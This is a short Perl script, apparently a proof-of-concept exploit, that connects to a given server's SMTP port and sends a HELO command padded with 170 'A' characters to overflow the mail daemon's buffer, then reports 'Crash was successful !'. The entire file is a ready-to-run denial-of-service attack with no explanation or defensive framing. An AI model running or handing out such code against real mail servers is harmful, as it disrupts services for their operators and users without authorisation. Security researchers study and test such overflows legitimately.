#!/usr/bin/perl
#
# ./$0.pl -s <server>
# sends data to stmpd, overflowing server buffer.
#
use Getopt::Std;
use IO::Socket;
getopts('s:', \%args);
if(!defined($args{s})){&usage;}
$serv = $args{s};
$foo = "A"; $number = 170; 
$data .= $foo x $number; $EOL="\015\012";
$remote = IO::Socket::INET->new(
		    Proto	=> "tcp",
		    PeerAddr	=> $args{s},
		    PeerPort	=> "smtp(25)",
		) || die("Unable to connect to smtp port at $args{s}\n");
$remote->autoflush(1);
print $remote "HELO $data". $EOL;
while (<$remote>){ print }

print("\nCrash was successful !\n");

sub usage {die("\n$0 -s <server>\n\n");}
